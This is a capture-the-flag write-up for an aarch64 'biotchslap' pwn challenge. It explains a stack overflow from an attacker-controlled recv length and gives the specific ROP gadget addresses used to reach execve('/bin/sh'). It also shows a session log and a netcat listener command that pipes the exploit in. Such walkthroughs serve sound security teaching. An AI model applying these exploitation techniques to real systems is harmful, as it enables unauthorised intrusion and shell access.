## Infos

**Author**: grimmlin  
**Category**: Pwn  
**Difficulty**: Medium  

## Description:
  Ever dreamt about slapping someone in the face across the Internet ? Dream no more!   
  running on biotchslap.insomni.hack:1070 with -nx, not chrooted

## Solution:

This challenge was just a nice way to reuse the qemu patches, and to introduce aarch64 ROP in a somewhat easy challenge.
As can be seen in the handle_biotch func, we control the length of the last recv, allowing us to easy control $pc.

The binary being static, a lot of gadgets can be found, and I chose a path that could allow me to do a syscall with execve.

First gadget is @ 0x447030

    ldp x15, x16, [sp, #0x90]   
    ldp x17, x18, [sp, #0xa0]   
    ldp x29, x30, [sp], #0xc0   
    ret

This will allow us to control x16, which will allow us to pop all registers in the next gadget @ 0x446278 :   

    ldp x0, x1, [sp, #0x40]   
    ldp x2, x3, [sp, #0x30]   
    ldp x4, x5, [sp, #0x20]   
    ldp x6, x7, [sp, #0x10]   
    ldp x8, x9, [sp], #0xd0   
    ldp x17, x30, [sp], #0x10   
    br x16

Now the last gadget needed is @ 0x40dd1c : 

    svc 0

Now to exploit this service, we can use ```/bin/sh``` as a username. The name being at a static position in the .data section, it can be passed to the execve syscall.
The next step is to listen from the attacker machine and sends a number big enough to cause the overflow, and the the packed ropchain.

    nc biotchslap.insomni.hack 1070   
    Enter your name :/bin/sh   
    Hello /bin/sh! Who shall we biotch-slap today ?   
    Enter IP address : 192.168.110.123   
    Alright, /bin/sh how much slaps ? 4   
    Sending 4 SLAPs   
    Checking status   
    Hope you liked it! Next version will feature a webcam to capture those treasure moments!   
    cat flag   
    INS{if_only_that_dream_machine_came_true...}

Of course on the 192.168.110.123 host we need to listen on port 1070 and send the exploit :   

    (python -u poc.py;cat) | nc -l -p 1070

